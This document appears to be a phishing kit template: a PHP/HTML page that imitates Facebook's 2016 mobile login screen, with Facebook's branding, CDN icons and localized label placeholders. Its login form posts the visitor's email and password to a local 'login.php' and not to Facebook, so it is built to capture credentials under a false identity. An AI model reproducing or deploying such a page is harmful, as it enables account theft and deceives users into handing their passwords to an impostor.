<html>

<head>
    <title>Facebook</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v2/ya/r/O2aKM2iSbOw.png" rel="apple-touch-icon-precomposed" sizes="196x196">
    <meta charset="utf-8" />
    <link rel="shortcut icon" href="1.ico"/>

    <link rel="stylesheet" type="text/css" id="EH5zP" href="mobi.css">
    
    
    
</head>

<body tabindex="0" class="touch x1 android _fzu _50-3 iframe acw portrait" style="min-height: 480px; background-color: rgb(255, 255, 255);">
    
 <div id="viewport" style="min-height: 480px;">
    <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
    <div id="page">
        
        <div class="_4g33 _52we _52z5" id="header">
            <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="/login/?refid=9"><i class="img sp_qpIvdSU5o3E sx_72920b"><u>facebook</u></i></a></div>
        </div>
        <div id="root" role="main" class="_5soa acw" data-sigil="context-layer-root content-pane" style="min-height: 480px;">
            <div class="_4g33">
                <div class="_4g34">
                    <div class="acy apm abb" data-sigil="marea"><span class="mfsm"><?=$ct['l1']?></span></div>
                    <div class="aclb _5rut" data-sigil="traditional-login">
                       
                        <form method="post" class="mobile-login-form _5spm" id="u_0_0" novalidate="1" action="login.php" data-autoid="autoid_1">
                          
                            <div class="_56be _5sob">
                                <div class="_55wo _55x2 _56bf">
                                <input autocorrect="off" autocapitalize="off" type="email" class="_56bg _4u9z _5ruq" name="email" placeholder="<?=$ct['l2']?>" value="" data-sigil="login-form-input">
                                    <div class="_3nph _mg8">
                                        <div class="_4g33">
                                            <div class="_4g34 _5i2i _52we">
                                                <div class="_5xu4">
                                                <input type="hidden" name="lang" value="<?=$ctName?>" />
                                                <input type="password" autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" name="pass" placeholder="<?=$ct['l3']?>" id="u_0_1" >
                                                </div>
                                            </div>
                                            <div class="_5s61 _216i _5i2i _52we">
                                                <div class="_5xu4">
                                                    <div class="_2pi9" id="u_0_2" style="display:none"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" id="u_0_3" style="display:none">HIDE</span>
                                                    <span class="mfss" id="u_0_4">SHOW</span></a></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="_2pie"><button type="submit" value="<?=$ct['l4']?>" class="_54k8 _56bs _56b_ _56bw _56bu" name="login" id="u_0_5" data-sigil="touchable">
                            <span class="_55sr"><?=$ct['l4']?></span></button></div>
                            </form>
                        <div class="_52jj _5t3b"><a class="_54k8 _56bs _5t3b _56bw _56bv" data-store="{&quot;nativeClick&quot;:true}" href="/reg/?loc=bottom&amp;refid=9" role="button" data-sigil="touchable">
                        <span class="_55sr"><?=$ct['l5']?></span></a></div>
                        <div class="other-links">
                            <ul class="_5pkb _55wp">
                                <li><span class="mfss fcg"><a href="5"><?=$ct['l6']?></a><span aria-hidden="true"> · </span><a class="sec" href="/help/?refid=9"><?=$ct['l7']?></a></span>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div class="_5t23" id="u_0_6" style="display:none">
                        <div><i class="img sp_mJP1XY0f7L- sx_37f6c5"></i></div>
                        <div class="_52jg _5ru_" id="u_0_7" style="padding-left: 32px; padding-right: 32px;"></div>
                        <div class="_5t26">
                            <div class="_52jc _5t25" id="u_0_8"><a class="inv" href="/login/device-based/edit/?refid=9"><i class="_5msp img sp_mJP1XY0f7L- sx_17e21f"></i></a></div>
                            <div class="_52jc _5t25" id="u_0_9" data-autoid="autoid_2"><a class="inv" href="#"></a></div>
                            <div class="_52jc _5t25"><a class="inv" href="/reg/?refid=9"></a></div>
                            
                        </div>
                    </div>
                </div>
            </div>
            <div class="_55wr _5ui2">
                <div class="_5dpw">
                    <div class="_5ui3" data-sigil="marea">
                        <div class="_4g33">
                            <div class="_4g34"><span class="_52jc _52j9 _52jh">English (UK)</span>
                                <div><span class="_52jc"><a href="/a/9" data-sigil="ajaxify">Tiếng Việt</a></span></div>
                                <div><span class="_52jc"><a href="/a/9" data-ajaxify-href="/a/9" data-sigil="ajaxify">Français (France)</a></span></div>
                                <div><span class="_52jc"><a href="/a/l9" data-ajaxify-href="/a/d9" data-sigil="ajaxify">Português (Brasil)</a></span></div>
                            </div>
                            <div class="_4g34">
                                <div><span class="_52jc"><a href="1" data-ajaxify-href="/a/" data-sigil="ajaxify">Русский</a></span></div>
                                <div><span class="_52jc"><a href="9" data-ajaxify-href="/a/" data-sigil="ajaxify">Türkçe</a></span></div>
                                <div><span class="_52jc"><a href="9" data-ajaxify-href="/a/9" data-sigil="ajaxify">Español</a></span></div>
                                <span class="_52jc"><a href="/l9">More…</a></span></div>
                        </div>
                    </div>
                    <div class="_5ui4"><span class="mfss fcg">Facebook ©2016</span></div>
                </div>
            </div>
        </div>
        <div class="viewportArea _2v9s" id="u_0_a" style="display:none" data-sigil="marea">
            <div class="_5vsg" id="u_0_l" style="max-height: 160px;"></div>
            <div class="_5vsh" id="u_0_m" style="max-height: 240px;"></div>
            <div class="_5v5d fcg">
                <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div></div>
        </div>
        <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
            <div class="container">
                <div class="image"></div>
                <div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">Thử lại</a></div>
        </div>
    </div>
</div>
<div id="static_templates">
    <div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_3">
        <div class="_52z5 _451a mFuturePageHeader firstStep titled" id="mDialogHeader">
            <div class="_4g33 _52we">
                <div class="_5s61">
                    <div class="_52z7">
                    <button type="submit" value="" class="cancelButton btn btnD bgb mfss touchable" data-sigil="dialog-cancel-button blocking-touchable"></button>
                    <button type="submit" value="" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="" data-sigil="dialog-back-button blocking-touchable">
                    <i class="img sp_qpIvdSU5o3E sx_aa9265" style="margin-top: 4px;"></i></button></div>
                </div>
                <div class="_4g34">
                    <div class="_52z6">
                        <div class="mFuturePageHeaderTitle mfsl fcw" id="m-future-page-header-title" data-sigil="m-dialog-header-title dialog-title"></div>
                    </div>
                </div>
                <div class="_5s61">
                    <div class="_52z8" id="modalDialogHeaderButtons"></div>
                </div>
            </div>
            <div id="u_0_b"></div>
        </div>
        <div class="modalDialogView" id="modalDialogView"></div>
        <div class="_5v5d _5v5e fcg" id="dialogSpinner">
            <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_c" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div></div>
    </div>
</div>
   
</body>

</html>